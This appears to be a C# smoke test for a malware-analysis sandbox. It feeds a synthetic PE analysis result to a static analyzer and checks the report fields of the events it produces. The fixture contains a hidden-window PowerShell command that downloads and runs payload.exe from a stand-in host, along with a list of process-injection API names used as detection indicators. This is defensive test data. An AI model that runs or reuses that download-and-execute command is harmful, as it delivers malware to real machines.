using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.StaticAnalysis;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies that granular static-analysis events carry report-ready Chinese
/// triage fields without requiring reports or rules to parse free-form English
/// messages. The scenario is synthetic and does not execute Hyper-V.
/// </summary>
internal sealed class StaticEventReportReadinessScenario : ISmokeTestScenario
{
    public string ScenarioId => "static.events-report-readiness.contract";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var samplePath = Path.Combine(context.RuntimeRoot, ScenarioId, "sample.exe");
        var events = StaticAnalyzer.CreateEvents(samplePath, CreateSyntheticStaticAnalysis())
            .Where(evt => evt.EventType.StartsWith("static.", StringComparison.OrdinalIgnoreCase))
            .ToList();

        SmokeAssert.True(events.Count >= 7, "Synthetic static analysis should produce multiple static.* rows.");

        foreach (var evt in events)
        {
            AssertReportReadinessFields(evt);
        }

        var command = events.Single(evt => evt.EventType == "static.string.command");
        SmokeAssert.True(command.Data["reportLane"] == "network-and-download", "Download command strings should land in network/download report lane.");
        SmokeAssert.True(command.Data["runtimeCorrelationRequired"] == "True", "Static command evidence should require runtime correlation.");
        SmokeAssert.True(command.Data["zhNextEvidenceHint"].Contains("DNS/HTTP/TLS/PCAP", StringComparison.Ordinal), "Download static hint should point analysts to network evidence.");

        var importCluster = events.Single(evt => evt.EventType == "static.pe.import.cluster");
        SmokeAssert.True(importCluster.Data["zhBehaviorFamily"].Contains("注入", StringComparison.Ordinal), "Process-injection import cluster should have Chinese behavior family text.");

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{events.Count} static.* rows expose reportLane/evidenceStrength/Chinese runtime-correlation hints."
        });
    }

    private static StaticAnalysisResult CreateSyntheticStaticAnalysis()
    {
        return new StaticAnalysisResult
        {
            FileFormat = "PE32+",
            Magic = "MZ/PE",
            IsPe = true,
            SectionCount = 1,
            Tags = ["packer_hint"],
            Sections =
            [
                new PeSectionInfo
                {
                    Name = ".text",
                    VirtualAddress = "0x1000",
                    RawDataOffset = "0x400",
                    VirtualSize = 8192,
                    RawDataSize = 4096,
                    Entropy = 7.85,
                    EntropyLabel = "very_high",
                    Characteristics = "0xE0000020",
                    IsExecutable = true,
                    IsWritable = true
                }
            ],
            Imports =
            [
                new PeImportModuleInfo
                {
                    ModuleName = "kernel32.dll",
                    NamedApiCount = 4,
                    SuspiciousApiNames = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
                    SuspiciousApiClusters = ["process-injection", "download"]
                }
            ],
            ImportApiClusters =
            [
                new PeImportApiClusterInfo
                {
                    Name = "process-injection",
                    HitCount = 3,
                    ApiNames = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
                }
            ],
            Resources =
            [
                new PeResourceInfo
                {
                    ResourceType = "RCDATA",
                    DataRva = "0x3000",
                    DataFileOffset = "0x1800",
                    Size = 65536,
                    Entropy = 7.6,
                    EntropyLabel = "very_high",
                    IsPayloadCandidate = true,
                    IsEmbeddedPe = true,
                    IsLarge = true,
                    Tags = ["resource_payload_candidate", "resource_embedded_pe", "resource_high_entropy_data"]
                }
            ],
            Overlay = new PeOverlayInfo
            {
                Present = true,
                StartOffset = "0x9000",
                Size = 8192,
                NonCertificateSize = 8192,
                LargestNonCertificateOffset = "0x9000",
                LargestNonCertificateSize = 8192,
                NonCertificateEntropy = 7.4
            },
            NetworkIndicators =
            [
                new StaticNetworkIndicator
                {
                    Kind = "url",
                    Value = "http://example.invalid/payload.exe",
                    Classification = "embedded"
                }
            ],
            PathIndicators =
            [
                new StaticPathIndicator
                {
                    Kind = "windows-path",
                    Value = @"C:\Users\Public\payload.exe",
                    Tags = ["executable_path_string", "temp_path_string"]
                }
            ],
            CommandIndicators =
            [
                new StaticCommandIndicator
                {
                    Category = "download-execute",
                    Tool = "powershell",
                    Value = "powershell -w hidden -c iwr http://example.invalid/payload.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe",
                    Tags = ["download_command_string", "script_interpreter_string"]
                }
            ],
            SuspiciousStrings =
            [
                new StaticStringFinding
                {
                    Category = "anti-debug-string",
                    Value = "IsDebuggerPresent",
                    Tags = ["anti_debug_string"]
                }
            ],
            InterestingStrings =
            [
                "static.yara.match:embedded_payload",
                "static.yara.strings:embedded_payload:$mz,$rcdata",
                "static.yara.meta:embedded_payload:scope=resource;mitre=T1027.009",
                "packer:synthetic"
            ]
        };
    }

    private static void AssertReportReadinessFields(SandboxEvent evt)
    {
        RequireData(evt, "reportLane");
        RequireData(evt, "evidenceStrength");
        RequireData(evt, "runtimeCorrelationRequired");
        RequireData(evt, "staticEvidenceBoundary");
        RequireData(evt, "zhBehaviorFamily");
        RequireData(evt, "zhTriageLevel");
        RequireData(evt, "zhEvidenceBoundary");
        RequireData(evt, "zhNextEvidenceHint");

        SmokeAssert.True(evt.Data["staticEvidenceBoundary"] == "does-not-prove-runtime-execution", $"{evt.EventType} should document the static-only boundary.");
        SmokeAssert.True(evt.Data["zhEvidenceBoundary"].Contains("不能单独证明行为已发生", StringComparison.Ordinal), $"{evt.EventType} should carry a Chinese static-evidence boundary.");
    }

    private static void RequireData(SandboxEvent evt, string key)
    {
        SmokeAssert.True(evt.Data.TryGetValue(key, out var value) && !string.IsNullOrWhiteSpace(value), $"{evt.EventType} should include data.{key}.");
    }
}
